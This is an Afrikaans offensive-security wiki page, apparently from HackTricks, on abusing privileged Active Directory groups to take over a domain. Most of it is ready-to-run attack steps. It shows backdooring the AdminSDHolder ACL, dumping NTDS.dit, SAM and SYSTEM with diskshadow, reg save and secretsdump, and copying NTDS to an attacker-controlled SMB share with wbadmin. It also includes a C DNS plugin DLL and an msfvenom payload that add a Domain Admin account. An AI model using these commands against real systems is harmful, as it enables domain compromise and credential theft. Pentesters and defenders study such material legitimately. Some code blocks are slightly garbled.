# Bevoorregte Groepe

{{#include ../../banners/hacktricks-training.md}}

## Goed Bekende groepe met administratiewe voorregte

- **Administrateurs**
- **Domein Administrateurs**
- **Enterprise Administrateurs**

## Rekening Operateurs

Hierdie groep is gemagtig om rekeninge en groepe te skep wat nie administrateurs op die domein is nie. Boonop stel dit plaaslike aanmelding op die Domein Beheerder (DC) in staat.

Om die lede van hierdie groep te identifiseer, word die volgende opdrag uitgevoer:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Die toevoeging van nuwe gebruikers is toegelaat, sowel as plaaslike aanmelding by DC01.

## AdminSDHolder-groep

Die **AdminSDHolder**-groep se Toegangsbeheerlisensie (ACL) is van kardinale belang aangesien dit toestemmings vir alle "beskermde groepe" binne Active Directory stel, insluitend hoëprivilege groepe. Hierdie meganisme verseker die sekuriteit van hierdie groepe deur ongeoorloofde wysigings te voorkom.

'n Aanvaller kan hiervan gebruik maak deur die **AdminSDHolder**-groep se ACL te wysig, wat volle toestemmings aan 'n standaard gebruiker verleen. Dit sou daardie gebruiker effektief volle beheer oor alle beskermde groepe gee. As hierdie gebruiker se toestemmings gewysig of verwyder word, sal dit outomaties binne 'n uur hersteld word weens die stelsel se ontwerp.

Opdragte om die lede te hersien en toestemmings te wysig sluit in:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
'n Skrip is beskikbaar om die herstelproses te versnel: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Vir meer besonderhede, besoek [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Herwinningsblik

Lidmaatskap in hierdie groep stel jou in staat om geleesde aktiewe gidsobjekte te lees, wat sensitiewe inligting kan onthul:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Domeinbeheerder Toegang

Toegang tot lêers op die DC is beperk tensy die gebruiker deel is van die `Server Operators` groep, wat die vlak van toegang verander.

### Privilege Escalation

Deur `PsService` of `sc` van Sysinternals te gebruik, kan 'n mens diensregte inspekteer en wysig. Die `Server Operators` groep het byvoorbeeld volle beheer oor sekere dienste, wat die uitvoering van arbitrêre opdragte en privilege escalasie toelaat:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Hierdie opdrag onthul dat `Server Operators` volle toegang het, wat die manipulasie van dienste vir verhoogde privilige moontlik maak.

## Backup Operators

Lidmaatskap in die `Backup Operators` groep bied toegang tot die `DC01` lêerstelsel as gevolg van die `SeBackup` en `SeRestore` privilige. Hierdie privilige stel vouer traversering, lysing, en lêer kopieer vermoëns in staat, selfs sonder eksplisiete toestemmings, deur die gebruik van die `FILE_FLAG_BACKUP_SEMANTICS` vlag. Dit is nodig om spesifieke skripte vir hierdie proses te gebruik.

Om groepslede te lys, voer uit:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Plaaslike Aanval

Om hierdie voorregte plaaslik te benut, word die volgende stappe gebruik:

1. Importeer nodige biblioteke:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Aktiveer en verifieer `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Toegang tot en kopieer lêers vanaf beperkte gidse, byvoorbeeld:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD-aanval

Direkte toegang tot die Domeinbeheerder se lêerstelsel maak die diefstal van die `NTDS.dit` databasis moontlik, wat alle NTLM-hashes vir domein gebruikers en rekenaars bevat.

#### Gebruik diskshadow.exe

1. Skep 'n skaduwee-kopie van die `C` skyf:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopieer `NTDS.dit` van die skadu kopie:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatiewelik, gebruik `robocopy` vir lêer kopieer:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Trek `SYSTEM` en `SAM` uit vir hash herwinning:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Verkry alle hashes van `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Gebruik wbadmin.exe

1. Stel NTFS-lêerstelsel op vir SMB-bediener op die aanvaller masjien en kas SMB-akkrediteer op die teiken masjien.
2. Gebruik `wbadmin.exe` vir stelselsrugsteun en `NTDS.dit` ekstraksie:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Vir 'n praktiese demonstrasie, sien [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Lede van die **DnsAdmins** groep kan hul voorregte benut om 'n arbitrêre DLL met SYSTEM voorregte op 'n DNS-bediener te laai, wat dikwels op Domein Beheerders gehos is. Hierdie vermoë bied 'n beduidende uitbuitingspotensiaal.

Om lede van die DnsAdmins-groep te lys, gebruik:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Voer arbitrêre DLL uit

Lede kan die DNS-bediener dwing om 'n arbitrêre DLL (of plaaslik of vanaf 'n afstandelike deel) te laai met behulp van opdragte soos:
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Herbegin van die DNS-diens (wat moontlik addisionele toestemmings vereis) is nodig vir die DLL om gelaai te word:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Vir meer besonderhede oor hierdie aanvalsvector, verwys na ired.team.

#### Mimilib.dll

Dit is ook haalbaar om mimilib.dll te gebruik vir opdraguitvoering, dit aan te pas om spesifieke opdragte of omgekeerde shells uit te voer. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) vir meer inligting.

### WPAD Record vir MitM

DnsAdmins kan DNS-rekords manipuleer om Man-in-the-Middle (MitM) aanvalle uit te voer deur 'n WPAD-record te skep nadat die globale navraagbloklys gedeaktiveer is. Gereedskap soos Responder of Inveigh kan gebruik word om te spoof en netwerkverkeer te vang.

### Event Log Readers
Lede kan toegang tot gebeurtenislogs verkry, wat moontlik sensitiewe inligting soos platte wagwoorde of opdraguitvoeringsbesonderhede kan bevat:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Toestemmings

Hierdie groep kan DACL's op die domein objek wysig, wat moontlik DCSync voorregte toeken. Tegnieke vir voorregte-eskalasie wat hierdie groep benut, is in die Exchange-AD-Privesc GitHub repo gedetailleerd.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Hyper-V Administrators het volle toegang tot Hyper-V, wat benut kan word om beheer oor gevirtualiseerde Domein Beheerders te verkry. Dit sluit die kloon van lewende DBs en die onttrekking van NTLM hashes uit die NTDS.dit-lêer in.

### Exploitation Example

Firefox se Mozilla Maintenance Service kan deur Hyper-V Administrators benut word om opdragte as SYSTEM uit te voer. Dit behels die skep van 'n harde skakel na 'n beskermde SYSTEM-lêer en dit vervang met 'n kwaadwillige uitvoerbare lêer:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Let wel: Hard link uitbuiting is in onlangse Windows-opdaterings gemitigeer.

## Organisasie Bestuur

In omgewings waar **Microsoft Exchange** ontplooi is, hou 'n spesiale groep bekend as **Organisasie Bestuur** beduidende vermoëns. Hierdie groep het die voorreg om **toegang te verkry tot die posbusse van alle domein gebruikers** en handhaaf **volledige beheer oor die 'Microsoft Exchange Security Groups'** Organisatoriese Eenheid (OU). Hierdie beheer sluit die **`Exchange Windows Permissions`** groep in, wat vir voorreg eskalasie benut kan word.

### Voorreg Uitbuiting en Opdragte

#### Druk Operateurs

Lede van die **Druk Operateurs** groep is toegerus met verskeie voorregte, insluitend die **`SeLoadDriverPrivilege`**, wat hulle toelaat om **lokaal aan te meld by 'n Domein Beheerder**, dit af te sluit, en drukkers te bestuur. Om hierdie voorregte te benut, veral as **`SeLoadDriverPrivilege`** nie sigbaar is onder 'n nie-verhoogde konteks nie, is dit nodig om die Gebruiker Rekening Beheer (UAC) te omseil.

Om die lede van hierdie groep te lys, word die volgende PowerShell-opdrag gebruik:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Vir meer gedetailleerde eksploitasi tegnieke rakende **`SeLoadDriverPrivilege`**, moet 'n mens spesifieke sekuriteitsbronne raadpleeg.

#### Remote Desktop Users

Die lede van hierdie groep word toegang tot rekenaars via Remote Desktop Protocol (RDP) toegestaan. Om hierdie lede te tel, is PowerShell-opdragte beskikbaar:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Verder insigte in die ontginning van RDP kan gevind word in toegewyde pentesting hulpbronne.

#### Afgeleë Bestuur Gebruikers

Lede kan toegang tot rekenaars oor **Windows Remote Management (WinRM)** verkry. Opname van hierdie lede word bereik deur:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Vir eksploitasiemetodes wat verband hou met **WinRM**, spesifieke dokumentasie moet geraadpleeg word.

#### Bediener Operateurs

Hierdie groep het toestemming om verskeie konfigurasies op Domein Beheerders uit te voer, insluitend rugsteun en herstel regte, die verandering van stelseltijd, en die afsluiting van die stelsel. Om die lede te tel, is die opdrag wat verskaf word:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Verwysings <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)


{{#include ../../banners/hacktricks-training.md}}
